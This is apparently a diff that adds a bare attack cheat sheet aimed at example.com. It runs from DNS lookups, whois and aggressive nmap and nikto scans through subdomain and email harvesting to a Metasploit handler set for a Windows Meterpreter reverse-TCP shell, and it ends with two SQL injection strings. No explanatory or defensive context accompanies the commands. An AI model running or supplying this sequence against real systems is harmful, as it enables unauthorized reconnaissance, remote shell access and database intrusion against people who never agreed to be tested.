@@ -1,1 +1,21 @@
+nslookup example.com
+dig example.com
+ping -c 4 example.com
+traceroute example.com
 
+whois example.com
+
+nmap -A -T4 example.com
+nmap -sV -p 1-65535 -O -Pn example.com
+sublist3r -d example.com
+theharvester -d example.com -l 500 -b google
+nmap --script vuln example.com
+nikto -h http://example.com
+msfconsole
+use exploit/multi/handler
+set payload windows/meterpreter/reverse_tcp
+set LHOST <your_IP>
+set LPORT <port>
+exploit
+' OR '1'='1
+' OR 1=1 --
